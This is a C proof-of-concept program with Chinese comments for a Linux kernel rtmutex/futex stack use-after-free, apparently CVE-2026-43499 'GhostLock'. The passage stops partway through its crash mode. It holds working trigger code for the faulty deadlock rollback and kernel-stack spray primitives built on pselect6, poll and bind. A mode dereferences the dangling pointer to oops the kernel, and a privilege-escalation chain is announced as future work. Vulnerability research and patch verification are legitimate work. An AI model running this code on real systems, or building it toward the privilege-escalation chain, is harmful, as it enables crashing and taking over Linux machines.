/*
 * ghostlock.c — CVE-2026-43499 (GhostLock) 独立验证程序
 *
 * 漏洞位置 : kernel/locking/rtmutex.c, remove_waiter()
 * 修复提交 : 3bfdc63936dd "rtmutex: Use waiter::task instead of current
 *            in remove_waiter()"
 *
 * 根因:
 *   remove_waiter() 同时服务于 slowlock 路径与 rt_mutex_start_proxy_lock()
 *   的 proxy-lock 回滚。后者由 futex_requeue() 调用，此时 current 是发起
 *   requeue 的线程，而 waiter 属于另一个线程。旧代码却对 current 做
 *   rt_mutex_dequeue() / current->pi_blocked_on = NULL：
 *
 *     raw_spin_lock(&current->pi_lock);
 *     rt_mutex_dequeue(lock, waiter);
 *     current->pi_blocked_on = NULL;      <-- 清错了任务
 *     raw_spin_unlock(&current->pi_lock);
 *
 *   结果：真正 waiter 线程的 pi_blocked_on 仍指向它自己内核栈上的
 *   struct rt_mutex_waiter。该栈帧在 syscall 返回时被弹出并复用，
 *   于是留下一个指向已释放内核栈的悬垂指针（stack-UAF）。
 *
 * 触发拓扑（三个 futex 字）:
 *   waiter : LOCK_PI(f_pi_chain)  ->  WAIT_REQUEUE_PI(f_wait -> f_pi_target)
 *   owner  : LOCK_PI(f_pi_target) ->  LOCK_PI(f_pi_chain)   [阻塞]
 *   main   : CMP_REQUEUE_PI(f_wait -> f_pi_target)
 *
 *   依赖环:  waiter -> f_pi_target -> owner -> f_pi_chain -> waiter
 *   rt_mutex_adjust_prio_chain() 返回 -EDEADLK，走有缺陷的回滚路径。
 *
 * 前提: CONFIG_FUTEX_PI=y（各发行版默认开启）。无需 CAP_SYS_ADMIN、
 *       无需 user namespace、无需特殊硬件。
 *
 * 本程序的三种模式:
 *   -check    只读检查：内核版本、FUTEX_PI 可用性、风险参数
 *   -trigger  只触发回滚，确认 syscall 序列可达。安全，可重复，不会崩内核
 *   -dangle   第一步：回滚后让 waiter 超时返回（此时 pi_blocked_on 已悬空），
 *             往那块失效的栈上灌 0x41，再抢一把新锁逼内核做 PI 链走。
 *             漏洞内核在读 waiter->lock 时必然 oops。不做任何伪造。
 *             -probe 是同义词（旧名字）。
 *   -start    完整利用链（本阶段尚未实现，当前返回 3）
 *
 * 退出码:
 *   0  通过 / 触发成功
 *   1  未通过
 *   2  用法错误
 *   3  环境不可用（内核不支持、缺少前提、权限不足）
 *
 * 仅用于自有机器或明确授权的测试环境。触发本身会短暂占用目标 PI futex
 * 并制造一次真实死锁回滚，请勿在生产机运行。
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/futex.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_futex
#define SYS_futex __NR_futex
#endif

#define GL_VERSION "0.5"

/* -------------------------------------------------------------------------
 * 日志
 * ---------------------------------------------------------------------- */

static int g_color = 1;

#define C_RST  "\033[0m"
#define C_DIM  "\033[2m"
#define C_RED  "\033[1;31m"
#define C_GRN  "\033[1;32m"
#define C_YEL  "\033[1;33m"
#define C_BLU  "\033[1;34m"
#define C_CYA  "\033[1;36m"

static void gl_color_init(void)
{
    g_color = isatty(STDOUT_FILENO);
}

static void col(const char *c)
{
    if (g_color)
        fputs(c, stdout);
}

static void pr_info(const char *fmt, ...)
{
    va_list ap;

    col(C_CYA);
    fputs("[*] ", stdout);
    col(C_RST);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_ok(const char *fmt, ...)
{
    va_list ap;

    col(C_GRN);
    fputs("[+] ", stdout);
    col(C_RST);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_warn(const char *fmt, ...)
{
    va_list ap;

    col(C_YEL);
    fputs("[!] ", stdout);
    col(C_RST);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_err(const char *fmt, ...)
{
    va_list ap;

    col(C_RED);
    fputs("[-] ", stdout);
    col(C_RST);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_dim(const char *fmt, ...)
{
    va_list ap;

    col(C_DIM);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    col(C_RST);
    fflush(stdout);
}

/* -------------------------------------------------------------------------
 * 版本解析与受影响区间
 * ---------------------------------------------------------------------- */

struct kver {
    int maj, min, pat;
};

static int kver_cmp(const struct kver *a, const struct kver *b)
{
    if (a->maj != b->maj)
        return a->maj - b->maj;
    if (a->min != b->min)
        return a->min - b->min;
    return a->pat - b->pat;
}

static void kver_parse(const char *rel, struct kver *v)
{
    v->maj = v->min = v->pat = 0;
    sscanf(rel, "%d.%d.%d", &v->maj, &v->min, &v->pat);
}

/*
 * 受影响区间（上游修复版本）:
 *   >= 2.6.39  且 < 6.1.175
 *   >= 6.2     且 < 6.6.140
 *   >= 6.7     且 < 6.12.86
 *   >= 6.13    且 < 6.18.27
 *   >= 6.19    且 < 7.0.4
 * 返回 1 表示落在区间内（按版本号推断受影响），0 表示已修复，-1 表示过老。
 */
static int kver_affected(const struct kver *v)
{
    static const struct kver lo = { 2, 6, 39 };
    static const struct kver f1 = { 6, 1, 175 };
    static const struct kver l2 = { 6, 2, 0 };
    static const struct kver f2 = { 6, 6, 140 };
    static const struct kver l3 = { 6, 7, 0 };
    static const struct kver f3 = { 6, 12, 86 };
    static const struct kver l4 = { 6, 13, 0 };
    static const struct kver f4 = { 6, 18, 27 };
    static const struct kver l5 = { 6, 19, 0 };
    static const struct kver f5 = { 7, 0, 4 };

    if (kver_cmp(v, &lo) < 0)
        return -1;
    if (kver_cmp(v, &f1) < 0)
        return 1;                       /* 2.6.39 .. 6.1.174 */
    if (kver_cmp(v, &l2) < 0)
        return 0;                       /* 6.1.175 .. 6.1.x 已修复 */
    if (kver_cmp(v, &f2) < 0)
        return 1;                       /* 6.2 .. 6.6.139 */
    if (kver_cmp(v, &l3) < 0)
        return 0;
    if (kver_cmp(v, &f3) < 0)
        return 1;                       /* 6.7 .. 6.12.85 */
    if (kver_cmp(v, &l4) < 0)
        return 0;
    if (kver_cmp(v, &f4) < 0)
        return 1;                       /* 6.13 .. 6.18.26 */
    if (kver_cmp(v, &l5) < 0)
        return 0;
    if (kver_cmp(v, &f5) < 0)
        return 1;                       /* 6.19 .. 7.0.3 */
    return 0;
}

/* -------------------------------------------------------------------------
 * futex 封装
 * ---------------------------------------------------------------------- */

static long gl_futex(uint32_t *uaddr, int op, uint32_t val,
                     const struct timespec *timeout,
                     uint32_t *uaddr2, uint32_t val3)
{
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* 探测 FUTEX_LOCK_PI 是否可用: 私有 futex 上取锁再释放 */
static int gl_futex_pi_supported(void)
{
    uint32_t w = 0;
    long r;

    r = gl_futex(&w, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r != 0) {
        if (errno == ENOSYS || errno == EINVAL || errno == EOPNOTSUPP)
            return 0;
        /* 其他错误也说明内核里存在该路径 */
    } else {
        gl_futex(&w, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    return 1;
}

/* -------------------------------------------------------------------------
 * 触发: 三 futex 拓扑
 *
 * 全部在子进程里跑一次，结束后 _exit()，不执行任何 PI 清理路径
 * （漏洞内核上，waiter 带着悬垂的 pi_blocked_on 去 unlock 会当场 oops，
 * 而这不是我们此时想看到的）。
 * ---------------------------------------------------------------------- */

#define GL_CORE_WAITER 0
#define GL_CORE_OWNER  1

static uint32_t g_wait, g_pi_target, g_pi_chain;
static uint32_t g_extra;          /* waiter 返回后自己占住的新锁 */

static void spray_stack_junk(unsigned char byte);

static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
#define GL_RET_NONE 0x7fffffff
static atomic_int g_waiter_ret;
static atomic_int g_waiter_errno;
static atomic_int g_requeue_ret;
static atomic_int g_requeue_errno;
static atomic_int g_abort;

/*
 * -dangle 用的状态
 *
 * 注意这里不再有"伪造对象"这回事: g_junk_byte 只是往那块已经失效的
 * 内核栈上灌一个固定字节, 让 waiter->lock 变成一个必然非法的指针。
 * 不构造 task/lock/prio 任何一个合法字段, 所以它连"伪 waiter"都算不上,
 * 只是一坨垃圾 —— 目的就是让解引用必崩。
 */
static atomic_int g_mode_dangle;
static atomic_int g_spray_go;
static atomic_int g_spray_stop;
static atomic_int g_waiter_tid;
static atomic_int g_spray_rounds;
static atomic_int g_wait_ms;      /* waiter 在 FUTEX_WAIT_REQUEUE_PI 上的超时 */
static atomic_int g_junk_byte;    /* 灌进内核栈的填充字节, 默认 0x41 */
static atomic_int g_tag_mode;     /* 1 = 三种原语各用一个标记, 用于定位命中源 */
static atomic_int g_extra_held;   /* waiter 已占住 g_extra */
static atomic_int g_spray_done;   /* 灌栈已完成, 主线程可以开始抢锁 */

static void pin_core(int cpu)
{
    cpu_set_t set;

    if (cpu < 0)
        return;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static void *gl_waiter_fn(void *arg)
{
    struct timespec ts;
    long r;

    (void)arg;
    pin_core(GL_CORE_WAITER);
    atomic_store(&g_waiter_tid, (int)syscall(SYS_gettid));

    /* 先拿到 chain，构成环的另一条边 */
    for (;;) {
        r = gl_futex(&g_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        if (r == 0 || errno != EAGAIN)
            break;
    }
    if (r != 0) {
        atomic_store(&g_waiter_ret, -1);
        atomic_store(&g_waiter_errno, errno);
        atomic_store(&g_waiter_ready, 1);
        return NULL;
    }

    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started) && !atomic_load(&g_abort))
        usleep(1000);
    if (atomic_load(&g_abort))
        return NULL;

    clock_gettime(CLOCK_MONOTONIC, &ts);
    {
        int ms = atomic_load(&g_wait_ms);

        if (ms <= 0)
            ms = 3000;
        ts.tv_sec += ms / 1000;
        ts.tv_nsec += (long)(ms % 1000) * 1000000L;
        if (ts.tv_nsec >= 1000000000L) {
            ts.tv_sec++;
            ts.tv_nsec -= 1000000000L;
        }
    }

    atomic_store(&g_waiter_waiting, 1);

    /*
     * 这一步把 rt_mutex_waiter 放到本线程的内核栈上。
     * 回滚发生时，它是 UAF 的受害者。
     */
    r = gl_futex(&g_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &g_pi_target, 0);

    atomic_store(&g_waiter_ret, (int)r);
    atomic_store(&g_waiter_errno, errno);

    /*
     * 到这一行，本线程的内核栈已经退回到用户态，`futex_wait_requeue_pi`
     * 那个放着 struct rt_mutex_waiter 的栈帧被弹掉了。
     *
     * 如果内核有缺陷，本线程的 pi_blocked_on 还指着那块已经被释放的栈。
     *
     * 顺序很关键，这里踩过一次: 先灌垃圾、再调 futex(LOCK_PI)，则后者
     * 的栈帧会把 futex_wait_requeue_pi 留下的 rt_waiter 区域重新压一遍。
     * 快路径虽然不初始化 rt_waiter，但中间的调度/中断足以把刚灌进去的
     * 标记洗掉 —— 上一版跑出来 CR2 是 0xffff905e 而不是 0x4141...，
     * 就是这么来的。
     *
     * 所以改成: 先把 g_extra 拿到手(快速路径，不建 waiter，也不写
     * pi_blocked_on)，再灌垃圾，让我们的标记成为那块内存的最后写入者。
     *
     * 主线程随后去抢这把新锁，内核就会从 owner（本线程）出发做 PI 链走，
     * 第一句 `waiter = task->pi_blocked_on` 拿到的正是那坨垃圾，
     * 读 waiter->prio、waiter->lock 立刻踩空 —— 必然 oops。
     */
    if (atomic_load(&g_mode_dangle)) {
        unsigned char jb = (unsigned char)atomic_load(&g_junk_byte);
        int i;

        if (gl_futex(&g_extra, FUTEX_LOCK_PI, 0, NULL, NULL, 0) == 0)
            atomic_store(&g_extra_held, 1);

        for (i = 0; i < 64; i++)
            spray_stack_junk(jb);

        atomic_store(&g_spray_done, 1);
        atomic_store(&g_spray_go, 1);

        /*
         * 这里必须纯用户态自旋，一个 syscall 都不能有。
         *
         * 上一版用的是 sched_yield()，看起来"栈帧极小"，但它会一路进到
         * __schedule()，那是个几百字节的栈帧，正好盖在 waiter 头上。
         * 每 yield 一次就冲一次，灌进去的 0x41 / 0x00 从来没活到主线程
         * 抢锁那一刻 —— CR2 每次都是 0xffffa0e28378093c 这种"低 12 位
         * 固定"的内核指针残留，就是 __schedule 的栈帧。
         */
        while (!atomic_load(&g_spray_stop))
            __asm__ __volatile__("pause" ::: "memory");

        gl_futex(&g_extra, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    return NULL;
}

/*
 * 往内核栈上灌垃圾。
 *
 * 这里踩过两个坑，都值得记下来。
 *
 * 坑一: 之前用 pselect6(1024, ...)，看似"768 字节栈缓冲"，实际上
 * core_sys_select() 里有这么一段:
 *
 *     size = FDS_BYTES(n);          // n=1024 -> 128
 *     bits = stack_fds;             // stack_fds 只有 256 字节
 *     if (size > sizeof(stack_fds) / 6)   // 128 > 42
 *             bits = kmalloc(...);  // 走堆，根本没碰栈
 *
 * 也就是说 nfds 稍大一点，内核就把 fd_set 换成 kmalloc 了，栈上什么
 * 都没写。要让它真的用栈，必须 size <= 42，即 nfds <= 336。
 *
 * 坑二: 只灌一个固定字节、重复同一个 syscall 没有意义。同一个 syscall
 * 的栈帧位置是固定的，灌 100 次也只是反复覆盖同一段；而
 * struct rt_mutex_waiter 落在 futex_wait_requeue_pi 的栈帧里，这个深度
 * 和 core_sys_select / do_sys_poll / __sys_bind 三者都不一样。
 * 所以要换用三种栈帧深度不同的 syscall，让它们的写入区间叠起来覆盖
 * 更大的纵深。
 *
 * 三种原语:
 *   pselect6  最多写 252 字节纯可控数据 (6 * FDS_BYTES(336))
 *   poll      最多写 232 字节 (29 * sizeof(struct pollfd))，其中每 8 字节
 *             只有后 4 字节可控(fd 被内核检查前是我们填的，但 -1 会占掉前 4)
 *   bind      最多写 128 字节纯可控数据 (struct sockaddr_storage)，
 *             内核在 ops->bind 之前就 copy_from_user 到栈上，
 *             之后 unix_bind() 因 addr_len 非法返回 EINVAL，
 *             但栈上那 128 字节已经写完了
 *
 * -tag 打开时三个原语分别用 byte / byte+1 / byte+2，这样一次 oops 就能
 * 从 dmesg 里的 CR2 反推: 到底是哪个原语、盖到了哪一段。
 */
static void spray_select_junk(unsigned char byte, int nfds)
{
    fd_set in, out, ex;
    struct timespec ts;

    if (nfds < 1)
        nfds = 1;
    if (nfds > 336)
        nfds = 336;

    memset(&in, byte, sizeof(in));
    memset(&out, byte, sizeof(out));
    memset(&ex, byte, sizeof(ex));
    ts.tv_sec = 0;
    ts.tv_nsec = 0;
    syscall(SYS_pselect6, nfds, &in, &out, &ex, &ts, NULL);
}

static void spray_poll_junk(unsigned char byte)
{
    struct pollfd pfd[29];
    int i;

    /* poll 的 stack_pps[256] 能塞 29 个 pollfd */
    memset(pfd, byte, sizeof(pfd));
    for (i = 0; i < 29; i++) {
        pfd[i].fd = -1;          /* 无效 fd, 内核立刻返回, 但栈已写 */
        pfd[i].events = (short)byte;
        pfd[i].revents = (short)byte;
    }
    /* 用 memory barrier 防止编译器把这一整块优化掉 */
    __asm__ __volatile__("" : : "r"(pfd) : "memory");
    poll(pfd, 29, 0);
}

static int g_bind_fd = -1;

static void spray_bind_junk(unsigned char byte)
{
    struct sockaddr_storage ss;

    if (g_bind_fd < 0)
        g_bind_fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (g_bind_fd < 0)
        return;

    memset(&ss, byte, sizeof(ss));
    /*
     * __sys_bind() 的局部变量 struct sockaddr_storage address 正好 128 字节,
     * move_addr_to_kernel() 会把它整块从用户态 copy 进来。之后
     * unix_bind() 因 addr_len 非法返回 EINVAL —— 但那时栈已经脏了。
     */
    bind(g_bind_fd, (struct sockaddr *)&ss, (socklen_t)sizeof(ss));
}

static void spray_stack_junk(unsigned char byte)
{
    int tag = atomic_load(&g_tag_mode);
    unsigned int round = (unsigned int)atomic_load(&g_spray_rounds);
    unsigned char b_poll = tag ? (unsigned char)(byte + 1) : byte;
    unsigned char b_bind = tag ? (unsigned char)(byte + 2) : byte;
    /* 让写入长度也在小范围内浮动，覆盖 stack_fds 尾部 */
    int nfds = 336 - (int)(round % 6) * 42;

    spray_select_junk(byte, nfds);
    spray_poll_junk(b_poll);
    spray_bind_junk(b_bind);

    atomic_fetch_add(&g_spray_rounds, 1);
}

static void *gl_owner_fn(void *arg)
{
    long r;

    (void)arg;
    pin_core(GL_CORE_OWNER);

    r = gl_futex(&g_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r != 0)
        return NULL;

    while (!atomic_load(&g_waiter_ready) && !atomic_load(&g_abort))
        usleep(1000);
    if (atomic_load(&g_abort))
        return NULL;

    atomic_store(&g_owner_started, 1);

    /* 阻塞在 waiter 持有的 chain 上，形成 waiter -> target -> owner -> chain */
    gl_futex(&g_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

/*
 * 一次完整触发。
 * 返回 0 = CMP_REQUEUE_PI 返回 EDEADLK（进入回滚路径）
 *      1 = 返回其它错误 / 没有形成环
 *      2 = 线程或 futex 初始化失败
 */
static int gl_trigger_once(int verbose)
{
    pthread_t th_w, th_o;
    sigset_t set;
    long r;
    int i;

    g_wait = 0;
    g_pi_target = 0;
    g_pi_chain = 0;
    atomic_store(&g_waiter_ready, 0);
    atomic_store(&g_waiter_waiting, 0);
    atomic_store(&g_owner_started, 0);
    atomic_store(&g_waiter_ret, GL_RET_NONE);
    atomic_store(&g_waiter_errno, 0);
    atomic_store(&g_requeue_ret, 1);
    atomic_store(&g_requeue_errno, 0);
    atomic_store(&g_abort, 0);

    /* 所有线程屏蔽信号，避免 EINTR 打断等待 */
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTERM);
    pthread_sigmask(SIG_BLOCK, &set, NULL);

    if (pthread_create(&th_o, NULL, gl_owner_fn, NULL) != 0)
        return 2;
    if (pthread_create(&th_w, NULL, gl_waiter_fn, NULL) != 0)
        return 2;

    /* 等 waiter 拿到 chain、owner 拿到 target 并阻塞到 chain 上 */
    for (i = 0; i < 3000; i++) {
        if (atomic_load(&g_waiter_waiting) && atomic_load(&g_owner_started))
            break;
        usleep(1000);
    }
    if (!atomic_load(&g_waiter_waiting) || !atomic_load(&g_owner_started)) {
        atomic_store(&g_abort, 1);
        return 2;
    }

    /* 给 owner 一点时间真正阻塞到 chain 上 */
    usleep(50 * 1000);

    errno = 0;
    r = gl_futex(&g_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &g_pi_target, 0);

    atomic_store(&g_requeue_ret, (int)r);
    atomic_store(&g_requeue_errno, errno);

    if (verbose) {
        struct timespec tw0, tw1;
        int waited = -1;

        pr_dim("    CMP_REQUEUE_PI  -> %ld (errno=%d %s)\n",
               r, errno, r ? strerror(errno) : "ok");

        clock_gettime(CLOCK_MONOTONIC, &tw0);
        for (i = 0; i < 6000; i++) {
            if (atomic_load(&g_waiter_ret) != GL_RET_NONE) {
                waited = i;
                break;
            }
            usleep(1000);
        }
        clock_gettime(CLOCK_MONOTONIC, &tw1);
        if (waited < 0) {
            pr_dim("    waiter          -> 6 秒内仍未返回（仍挂在 f_wait 上）\n");
        } else {
            pr_dim("    waiter 返回     -> %d (errno=%d), 耗时 %ld ms\n",
                   atomic_load(&g_waiter_ret), atomic_load(&g_waiter_errno),
                   (long)((tw1.tv_sec - tw0.tv_sec) * 1000 +
                          (tw1.tv_nsec - tw0.tv_nsec) / 1000000));
        }
    }

    if (r != 0 && errno == EDEADLK)
        return 0;

    return 1;
}

/*
 * 子进程里跑一次触发，然后立刻 _exit。
 * 退出码: 0 = EDEADLK, 1 = 其它, 2 = 环境问题
 */
static int gl_trigger_child(int verbose)
{
    int rc;

    /* 关掉 core dump: 一旦内核 oops，不要在生产盘上留几百兆 */
    setrlimit(RLIMIT_CORE, &(struct rlimit){ 0, 0 });

    rc = gl_trigger_once(verbose);
    fflush(NULL);
    _exit(rc);
}

static int gl_trigger(int attempts, int verbose)
{
    int i, ok = 0, bad = 0, env = 0;

    pr_info("触发 %d 次（每次一个独立子进程，结束后立即退出）\n", attempts);

    for (i = 1; i <= attempts; i++) {
        pid_t pid;
        int st = 0, rc;
        struct timespec t0, t1;

        if (attempts > 1)
            printf("%s  #%d/%d ...%s\n", g_color ? C_DIM : "",
                   i, attempts, g_color ? C_RST : "");
        fflush(stdout);

        clock_gettime(CLOCK_MONOTONIC, &t0);
        pid = fork();
        if (pid < 0) {
            pr_err("fork 失败: %s\n", strerror(errno));
            return 3;
        }
        if (pid == 0)
            gl_trigger_child(verbose);

        waitpid(pid, &st, 0);
        clock_gettime(CLOCK_MONOTONIC, &t1);

        if (WIFSIGNALED(st)) {
            pr_warn("  子进程被信号 %d 终止（可能已触发内核异常）\n",
                    WTERMSIG(st));
            bad++;
            continue;
        }
        rc = WEXITSTATUS(st);
        if (rc == 0) {
            ok++;
            pr_ok("  EDEADLK 回滚已进入（%.1f ms）\n",
                  (t1.tv_sec - t0.tv_sec) * 1000.0 +
                  (t1.tv_nsec - t0.tv_nsec) / 1e6);
        } else if (rc == 2) {
            env++;
            pr_warn("  环境不满足（futex 初始化/时序失败）\n");
        } else {
            bad++;
            pr_warn("  未形成死锁环（返回 %d）\n", atomic_load(&g_requeue_ret));
        }
    }

    printf("\n");
    if (ok > 0) {
        pr_ok("成功进入回滚路径 %d/%d 次\n", ok, attempts);
        pr_dim("    这说明 FUTEX_CMP_REQUEUE_PI 的 proxy-lock 回滚可达。\n"
               "    但注意：打了补丁的内核同样会走回滚路径并返回 EDEADLK，\n"
               "    所以这一步只证明\"序列可达\"，不等于\"有漏洞\"。\n");
        return 0;
    }
    if (env == attempts) {
        pr_err("每次都在初始化阶段失败，本机可能不支持 PI futex\n");
        return 3;
    }
    pr_err("没有进入回滚路径，本机不满足触发条件\n");
    return 1;
}

/* -------------------------------------------------------------------------
 * -check
 * ---------------------------------------------------------------------- */

static long read_long_file(const char *path, long dflt)
{
    FILE *f = fopen(path, "r");
    long v;

    if (!f)
        return dflt;
    if (fscanf(f, "%ld", &v) != 1)
        v = dflt;
    fclose(f);
    return v;
}

static int gl_check(void)
{
    struct utsname u;
    struct kver v;
    int aff, pi, rc = 0;
    long panic_on_oops, nproc;
    uid_t uid = getuid();

    pr_info("GhostLock / CVE-2026-43499 环境检查\n");
    printf("\n");

    if (uname(&u) != 0) {
        pr_err("uname 失败: %s\n", strerror(errno));
        return 1;
    }
    kver_parse(u.release, &v);

    printf("  内核      : %s\n", u.release);
    printf("  架构      : %s\n", u.machine);
    printf("  当前用户  : uid=%u%s\n", (unsigned)uid,
           uid == 0 ? " (root, 提权无意义)" : "");
    printf("\n");

    aff = kver_affected(&v);
    if (aff == 1) {
        pr_warn("版本区间  : 落在受影响范围（按上游版本号推断）\n");
        pr_dim("    受影响: 2.6.39~6.1.174 / 6.2~6.6.139 / 6.7~6.12.85\n"
               "            6.13~6.18.26 / 6.19~7.0.3\n");
    } else if (aff == 0) {
        pr_ok("版本区间  : 高于该分支的修复版本\n");
        pr_dim("    发行版可能另有 backport，最终仍以 -trigger / -dangle 实测为准。\n");
        rc = 1;
    } else {
        pr_warn("版本区间  : 低于 2.6.39，理论上不含此代码\n");
        rc = 1;
    }

    pi = gl_futex_pi_supported();
    if (pi) {
        pr_ok("FUTEX_PI  : 可用（CONFIG_FUTEX_PI 已编入）\n");
    } else {
        pr_err("FUTEX_PI  : 不可用，本机无此攻击面\n");
        rc = 1;
    }

    panic_on_oops = read_long_file("/proc/sys/kernel/panic_on_oops", -1);
    nproc = sysconf(_SC_NPROCESSORS_ONLN);
    printf("\n");
    printf("  逻辑 CPU  : %ld\n", nproc > 0 ? nproc : 1);
    printf("  panic_on_oops : %ld%s\n", panic_on_oops,
           panic_on_oops == 1 ? "  (内核 oops 会直接 panic)" : "");

    printf("\n");
    pr_info("下一步\n");
    pr_dim("    1) ./ghostlock -trigger -n 5     确认回滚序列可达（安全）\n"
           "    2) ./ghostlock -dangle -force    把悬空指针解引用掉，确认 UAF 真实存在\n"
           "                                     （会 oops，需可重启的虚拟机）\n"
           "    3) ./ghostlock -start            完整提权链（尚未实现）\n");

    return rc;
}

/* -------------------------------------------------------------------------
 * -dangle: 第一步，只要悬空指针
 *
 * 这里刻意不做任何伪造:
 *   - 不布局 rt_mutex_waiter 的字段
 *   - 不准备 task / lock / prio 任何一个合法指针
 *   - 不追求把指针指向可控内存
 *
 * 只做"破坏": 往那块已经失效的内核栈灌 0x41，然后让内核自己来读它。
 * 读 waiter->prio 时得到 0x41414141，与 task->prio 不等，于是继续读
 * waiter->lock，得到 0x4141414141414141 —— 非规范地址，解引用即 #GP。
 *
 * 判据（dmesg）:
 *   RIP: rt_mutex_adjust_prio_chain+0x...
 *   调用栈: task_blocks_on_rt_mutex -> rt_mutex_slowlock -> futex_lock_pi
 *   fault 地址形如 0x4141414141414141
 *
 * 打在已修复的内核上: pi_blocked_on 被正确清成 NULL，
 * rt_mutex_adjust_prio_chain() 在 `if (!waiter)` 处返回，
 * 主线程只是正常睡到一把锁上，不会崩。
 * ---------------------------------------------------------------------- */

static int gl_dangle_once(int verbose)
{
    pthread_t th_w, th_o;
    long r;
    int i;

    g_wait = 0;
    g_pi_target = 0;
    g_pi_chain = 0;
    g_extra = 0;
    atomic_store(&g_waiter_ready, 0);
    atomic_store(&g_waiter_waiting, 0);
    atomic_store(&g_owner_started, 0);
    atomic_store(&g_waiter_ret, GL_RET_NONE);
    atomic_store(&g_waiter_errno, 0);
    atomic_store(&g_abort, 0);
    atomic_store(&g_mode_dangle, 1);
    atomic_store(&g_wait_ms, 500);   /* 回滚后让 waiter 尽快超时返回 */
    atomic_store(&g_spray_go, 0);
    atomic_store(&g_spray_stop, 0);
    atomic_store(&g_spray_rounds, 0);
    atomic_store(&g_extra_held, 0);
    atomic_store(&g_spray_done, 0);

    if (pthread_create(&th_o, NULL, gl_owner_fn, NULL) != 0)
        return 2;
    if (pthread_create(&th_w, NULL, gl_waiter_fn, NULL) != 0)
        return 2;

    for (i = 0; i < 3000; i++) {
        if (atomic_load(&g_waiter_waiting) && atomic_load(&g_owner_started))
            break;
        usleep(1000);
    }
    if (!atomic_load(&g_waiter_waiting) || !atomic_load(&g_owner_started)) {
        atomic_store(&g_abort, 1);
        return 2;
    }

    usleep(50 * 1000);

    errno = 0;
    r = gl_futex(&g_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &g_pi_target, 0);
    atomic_store(&g_requeue_ret, (int)r);
    atomic_store(&g_requeue_errno, errno);

    if (r != 0 && errno != EDEADLK) {
        pr_warn("  未进入回滚，返回 %ld errno=%d\n", r, errno);
        return 1;
    }
    if (verbose)
        pr_dim("    回滚完成（EDEADLK），等 waiter 超时返回...\n");

    /*
     * 等 waiter 熬过它自己的 500ms 超时、灌完垃圾、并占住 g_extra。
     * 这期间主线程绝不能去碰 waiter 的优先级 —— 那会提前触发一次
     * 链走，把还没灌好的悬空指针读成原来的合法 waiter。
     */
    /*
     * 主线程这边也要快: waiter 一旦开始自旋, 它随时可能被时间片打断,
     * 一打断 __schedule 就把栈盖了。所以轮询间隔从 1ms 压到 100us,
     * 把"喷射完成 -> 抢锁"这段窗口尽量缩短。
     */
    for (i = 0; i < 80000; i++) {
        if (atomic_load(&g_extra_held) && atomic_load(&g_spray_done))
            break;
        usleep(100);
    }

    if (!atomic_load(&g_extra_held) || !atomic_load(&g_spray_done)) {
        pr_warn("  waiter 没有就绪（占锁=%d 灌栈=%d 轮），无法驱动链走\n",
                atomic_load(&g_extra_held), atomic_load(&g_spray_rounds));
        atomic_store(&g_abort, 1);
        atomic_store(&g_spray_stop, 1);
        return 1;
    }

    if (verbose)
        pr_dim("    waiter 已灌 %d 轮并占住新锁，悬空指针就绪；主线程开始抢锁\n",
               atomic_load(&g_spray_rounds));

    /*
     * 决定性的一步。
     *
     * 主线程去抢 waiter 刚占住的 g_extra，会走到:
     *
     *   futex_lock_pi -> rt_mutex_slowlock -> task_blocks_on_rt_mutex
     *     -> rt_mutex_adjust_prio_chain(owner = waiter 线程)
     *          waiter = task->pi_blocked_on;   <-- 悬空指针
     *          if (waiter->prio == task->prio) ...
     *          lock = waiter->lock;            <-- 0x4141...41, 当场踩空
     *
     * 漏洞内核上这条语句不会返回；已修复的内核上 pi_blocked_on 是 NULL，
     * 函数在 `if (!waiter)` 处直接退出，主线程正常睡眠在这把锁上。
     */
    if (verbose)
        pr_dim("    LOCK_PI(g_extra) ...\n");

    r = gl_futex(&g_extra, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

    /* 能走到这里说明没崩：悬空指针没被读到 */
    pr_warn("  LOCK_PI 返回了 %ld (errno=%d)，链走没有踩到悬空指针\n",
            r, errno);
    atomic_store(&g_spray_stop, 1);
    return 1;
}

static int gl_dangle(int force, int verbose)
{
    long p = read_long_file("/proc/sys/kernel/panic_on_oops", -1);
    int junk = atomic_load(&g_junk_byte);
    pid_t pid;
    int st = 0, i, reaped = 0;

    pr_warn("这一步会主动让内核 oops：悬空指针被解引用，页错误不可恢复\n");
    printf("  panic_on_oops = %ld\n", p);
    if (p == 1 && !force) {
        pr_err("当前内核配置为 oops 即 panic。确认可以重启后加 -force 再跑\n");
